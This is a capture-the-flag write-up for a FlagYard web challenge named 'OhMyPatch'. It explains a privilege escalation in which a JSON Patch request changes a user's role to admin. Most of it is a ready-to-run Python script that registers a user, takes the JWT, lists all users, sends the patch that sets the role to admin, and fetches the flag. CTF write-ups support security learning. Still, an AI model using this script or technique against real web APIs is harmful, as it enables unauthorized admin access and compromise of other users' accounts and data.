# OhMyPatch

**Challenge Name**: OhMyPatch  
**Category**: Web  
**Points**: 120  
**Platform**: FlagYard

## Challenge Overview:
In this challenge, the goal is to exploit a web application by escalating privileges and retrieving a flag by JSON Patch exploit. The challenge involves a series of steps including user registration, API manipulation, and a privilege escalation exploit.

### Steps Involved:

1. **User Registration**:
   - Register a new user using the `/register` endpoint.
   - A token is retrieved from the response, which is used for authentication in later steps.

2. **Fetching All Users**:
   - Fetch all users from the `/users` endpoint.
   - Find the specific user by their name (e.g., "JohnDoe") and retrieve their user ID.

3. **Privilege Escalation**:
   - Perform a privilege escalation by modifying the role of a user to "admin" using a `PATCH` request.

4. **Retrieving the Flag**:
   - After escalating privileges, access the `/flag` endpoint to retrieve the flag.

### Key Endpoints:
- `POST /register`: Register a new user.
- `GET /users`: Fetch the list of all users.
- `PATCH /patch`: Modify a user's role to admin.
- `GET /flag`: Retrieve the flag after escalating privileges.

### Techniques Used:
- **JSON Web Token (JWT)**: Used for authentication.
- **Privilege Escalation**: Role modification exploit.
- **API Manipulation**: Exploit of web API endpoints, particularly the `PATCH` method.

### Tools & Libraries:
- **Python**: Script is written in Python.
- **Requests Library**: Used to handle HTTP requests.
- **JSON Patch**: Used to modify the role of users.

## Code
**Here it is an automated script that do all the work for you by me :)**
```python
import requests
import json
import sys

# Base URL
# Change this to the target URL
base_url = "http://instace-target.com"

# User Information
username_to_register = "newuser"
name_to_find = "JohnDoe"  # Change this to the desired user name

# Step 1: User Registration
register_url = f"{base_url}/register"
user_data = {
    "name": name_to_find,  # Use the name to find id
    "username": username_to_register,
    "password": "securepassword",
    "age": 25,
    "department": "IT"
}

print("[+] Registering user...")
register_response = requests.post(register_url, headers={
                                  "Content-Type": "application/json"}, data=json.dumps(user_data))

if register_response.status_code == 200:
    print("[+] User registered successfully.")
    response_json = register_response.json()
    # Fetch token from the correct key
    token = response_json.get("access_token")
    if token:
        print(f"[+] Token retrieved: {token}")
    else:
        print("[-] Token not found in the registration response.")
        print("Response:", response_json)
        sys.exit(1)
else:
    print(f"[-] Failed to register user. Status Code: {
          register_response.status_code}, Response: {register_response.text}")
    sys.exit(1)

# Step 2: Fetch all users to get user ID
users_url = f"{base_url}/users"  # Use the base URL
print("[+] Fetching all users...")

# Verify that the token is valid before using it
if len(token.split(".")) != 3:
    print(f"[-] Invalid JWT token format: {token}")
    sys.exit(1)

users_response = requests.get(
    users_url, headers={"Authorization": f"Bearer {token}"})

if users_response.status_code == 200:
    users_data = users_response.json()
    print(f"[+] Users fetched successfully: {users_data}")
else:
    print(f"[-] Failed to fetch users. Status Code: {
          users_response.status_code}, Response: {users_response.text}")
    sys.exit(1)

# Find our user by the "name" field
user_id = None
for user in users_data['users']:
    if user['name'] == name_to_find:
        user_id = user['id']
        break

if user_id is None:
    print(f"[-] Failed to find the user '{name_to_find}' in the users list.")
    sys.exit(1)
else:
    print(f"[+] Found user ID: {user_id}")

# Step 3: Privilege Escalation (Patch the found user ID to Admin)
patch_url = f"{base_url}/patch"  # Use the base URL
patch_data = [
    {
        "op": "replace",
        "path": f"/users/{user_id - 1}/role",
        "value": "admin"
    }
]

print(f"[+] Escalating privileges for user ID {user_id - 1} to admin...")
patch_response = requests.patch(patch_url, headers={
    "Content-Type": "application/json",
    "Authorization": f"Bearer {token}"
}, data=json.dumps(patch_data))

if patch_response.status_code == 200:
    print(f"[+] Privilege escalation successful: {patch_response.text}")
else:
    print(f"[-] Failed to escalate privileges. Status Code: {
          patch_response.status_code}, Response: {patch_response.text}")
    sys.exit(1)

# Step 4: Retrieve Flag
flag_url = f"{base_url}/flag"  # Use the base URL

print("[+] Attempting to retrieve flag...")
flag_response = requests.get(flag_url, headers={
    "Authorization": f"Bearer {token}",
    "Content-Type": "application/json"
})

if flag_response.status_code == 200:
    print(f"[+] Flag retrieved: {flag_response.text}")
else:
    print(f"[-] Failed to retrieve flag. Status Code: {
          flag_response.status_code}, Response: {flag_response.text}")
    sys.exit(1)
```

### Conclusion:
By leveraging API manipulation and privilege escalation, this challenge allows the retrieval of a flag to complete the CTF. Understanding how to exploit user role modifications in web applications is crucial to succeeding in this challenge.
